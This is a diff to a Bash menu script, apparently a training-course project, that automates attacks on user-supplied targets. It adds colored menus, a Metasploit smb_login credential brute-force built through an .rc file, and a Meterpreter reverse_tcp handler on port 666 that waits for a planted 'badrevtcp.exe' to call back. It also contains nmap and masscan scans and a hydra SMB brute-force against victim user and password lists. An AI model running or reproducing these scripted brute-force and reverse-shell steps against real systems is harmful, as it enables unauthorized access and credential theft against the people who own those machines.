@@ -9,7 +9,7 @@ function menu ()
 #echo -e  \n for new line.
 
 echo -e "\nPlease select the appropriate action by entering the corresponding number followed by ENTER."
-echo -e "\n1) To setup and initialise the system. \n2) To conduct system scans or attacks. \n3) View/Access the log files. \n \n0) To quit.\n"
+echo -e "\n\e[0;32m1) To setup and initialise the system.\e[m \e[31m\n2) To conduct system scans or attacks.\e[m \n3) View/Access the log files. \n \n\e[1;35m0) Quit.\n\e[m"
 read CHOICE1
 echo -e "\nYou chose option $CHOICE1.\n"
 case $CHOICE1 in
@@ -22,21 +22,25 @@ case $CHOICE1 in
 	;;
 
 	2)
-		echo "Taking you to the network scan / attack menu."
+		echo -e "\e[1;31mWelcome to the network scan / attack menu.\n\e[m"
 		
 		chkme
 		
 	;;
 
 	3)	echo "View or access the log files."
+		
+		LOGIT
 	;;
 
 	0)	echo "Quit" 
-	exit
+			exit
 	;;
 	
 	*)  echo "Invalid option!"
-	;;
+			menu
+		;;
+	
 	esac
 }
 
@@ -59,9 +63,9 @@ function  chkme()
 {
 echo -e "Before conducting scans or attacks please provide the requested inputs.\n"
 	
-read -p "Please provide a target IP(s) or hostname(s) for nmap. (e.g Can be a specific ip or range, for example 10.0.0.1 or 10.0.0.1/24):" tgtIP
+read -rep $'Please provide a target IP(s) or hostname(s). \n\e[3m(e.g Can be a specific ip or range, for example 10.0.0.1 or 10.0.0.1/24)\e[0m:' tgtIP
 		
-read -p "Please provide the target port(s). (e.g ENTER for null, can be a specific port, ports or port range, 80, 22,53,80,443 or 100-8080): " tgtport
+read -rep $'Please provide the target port(s). \n\e[3m(e.g ENTER for null, can be a specific port, ports or port range, 80 or 22,53,80,443 or 100-8080)\e[0m:' tgtport
 
 echo -e "\nYou have entered $tgtIP as the target ip or ip range.\n"
 		
@@ -69,10 +73,11 @@ echo -e "\nYou have entered $tgtport as the target port or port range for massca
 
 echo -e "\nPlease select the process you would like to start."
 
-echo -e "\n1) Conduct an nmap scan. \n2) Conduct a masscan. \n3) Conduct a hydra attack. \n4) Conduct an attack 2 \n0) To quit.\n"
+echo -e "\n\e[33m1) Conduct an nmap scan. \n2) Conduct a masscan.\e[0m \n\e[31m3) Conduct a hydra attack. \n4) Conduct a metasploit SMB attack. \e[3m\e[1m(Port 445 must be open)\e[0m \e[31m\n5) Conduct a metaploit reverse tcp attack. \e[3m\e[1m(Requires badrevtcp.exe to be executed on the target system) \e[0m \n \n\e[1;35m0)Quit.\n\e[m"
 
 read CHOICE2
 echo -e "\nYou chose option $CHOICE2.\n"
+
 case $CHOICE2 in
 
 	1)
@@ -80,16 +85,18 @@ case $CHOICE2 in
 	
 	if [[ -n "$tgtport" ]]
 	then
-	echo -e "Conducting an nmap scan.......\n "
-	#Run nmap scan ans save the output to a file
-			nmap -Pn -sV "$tgtIP" -oN nmapscan_output
-	else
-	echo -e "Conducting an nmap scan.......\n "
+	
+	echo -e "Conducting an nmap scan with port specified.......\n "
 	#With port inputs
 			nmap -Pn -sV -p "$tgtport" "$tgtIP" -oN nmapscan_output
+	else
+	
+	echo -e "Conducting an nmap scan with no port specified.......\n "
+	#Run nmap scan ans save the output to a file
+			nmap -Pn -sV "$tgtIP" -oN nmapscan_output
 	fi
 		
-		echo "\n Scan outputs have been saved to this working directory as nmapscan_output.\n"
+		echo -e "\n Scan outputs have been saved to the current working directory as nmapscan_output.\n"
 		
 		menu
 		;;
@@ -114,7 +121,7 @@ case $CHOICE2 in
 			sudo masscan "$tgtIP" -p "$mstgtport" > masscan_output
 	fi
 
-		echo -e "\nScan outputs have been saved to this working directory as massscan_output.\n"
+		echo -e "\nScan outputs have been saved to the current working directory as masscan_output.\n"
 		
 		menu
 		;;
@@ -125,34 +132,121 @@ case $CHOICE2 in
 		#cat nmapscan_output | grep tcp | awk -F "/" '{print($1)}' | grep -x -E '[[:digit:]]+'
 		hydra -L victimuser.lst -P victimpassword.lst $tgtIP smb -vV -o hydra_output
 		
-		echo -e "\nScan outputs have been saved to this working directory as hydra_output.\n"
+		echo -e "\nScan outputs have been saved to the current working directory as hydra_output.\n"
 		
 		menu
 		;;
 	
-	4)	echo "Conducting an attack 2"
+	4)	echo -e "\nConducting a metasploit SMB enumeration attack"
+	
+	#Send the required options for msfconsole to the .rc file.
+			echo 'use auxiliary/scanner/smb/smb_login' > smb_enum.rc
+			echo 'set rhosts' $tgtIP >> smb_enum.rc
+			echo 'set user_file victimuser.lst' >> smb_enum.rc
+			echo 'set pass_file victimpassword.lst' >> smb_enum.rc
+			echo 'exploit' >> smb_enum.rc
+			echo 'exit' >> smb_enum.rc
+			
+			msfconsole -r smb_enum.rc -o smbattack_result
+			
+			echo -e "\nScan outputs have been saved to the current working directory as smbattack_result.\n"
+			
+			menu	
 		;;
 		
-#Stretch goal reverse tcp attack.		
+	#Stretch goal reverse tcp attack.	
+
+	5)	echo -e "\nConducting a metasploit reverse tcp attack. This will get you a meterpreter session."
+	
+		myIP=$(hostname -I | awk '{print $1}');
+		 
+		echo "Your local IP is $myIP."
+	
+		#Send the required options for msfconsole to the .rc file.
+			echo 'use exploit/multi/handler' > revtcp_enum.rc
+			echo 'set payload windows/meterpreter/reverse_tcp' >> revtcp_enum.rc
+			echo 'set lhost' $myIP >> revtcp_enum.rc
+			echo 'set lport 666' >> revtcp_enum.rc
+			echo 'set SessionLogging true' >> revtcp_enum.rc
+			echo 'spool ./msfconsole.log' >> revtcp_enum.rc
+			echo 'exploit' >> revtcp_enum.rc
+			
+			msfconsole -r revtcp_enum.rc
+			
+			echo "This session has been logged in ./msfconsole.log."
+			
+			menu	
+		;;
 
 	0)	echo "Goodbye" 
 				exit
 		;;
 	
 	*)  echo "Invalid option!"
+		menu
+		
 		;;
+			
 	esac
 }
 
-#~ function LOGIT()
-#~ #use this function to save results such as date, time, IPs, kind of attack.
-#~ {
+function LOGIT()
+#use this function to save results such as date, time, IPs, kind of attack.
+{
+echo -e "\nThe outputs have all been saved to the current working directory.\n"
+echo -e "\nPlease select the appropriate action by entering the corresponding number followed by ENTER."
+echo -e "\n1) To view the Nmapscan output. \n2) To view the Masscan output. \n3) To view the Hydra attack result. \n4) To view the metasploit SMB attack result. \n5) To view the metasploit Reverse TCP attack result.\\n \n\e[1;35m0)Quit.\n\e[m"	
+read CHOICE3
+echo -e "\nYou chose option $CHOICE3.\n"
+case $CHOICE3 in
 
-#~ }
+	1)
+		echo "Here are the Nmapscan results."
+		
+		cat nmapscan_output
+		menu
+		;;
 
+	2)
+		echo "Here are the Masscan results."
+		
+		cat masscan_output
+		menu
+		;;
+
+	3)
+		echo "Here are the Hydra attack results."
+		
+		cat hydra_output
+		menu
+		;;
+
+	4)
+		echo "Here are the metasploit SMB attack results."
+		
+		cat smbattack_result
+		menu
+		;;
+
+	5)
+		echo "Here are the metasploit Reverse TCP attack results."
+		
+		cat msfconsole.log
+		menu
+		;;		
+
+	0)	echo "Quit" 
+			exit
+		;;
+	
+	*)  echo "Invalid option!"
+		menu
+		;;
+	esac
+}
 #3. Log executed Attacks
 #Every scan or attack should be logged and saved with the date and used arguments.
 
 #Create all the necessary files in the system to avoid errors.
-touch nmapscan_output massscan_output hydra_output
+touch smb_enum.rc revtcp_enum.rc nmapscan_output massscan_output hydra_output
 menu
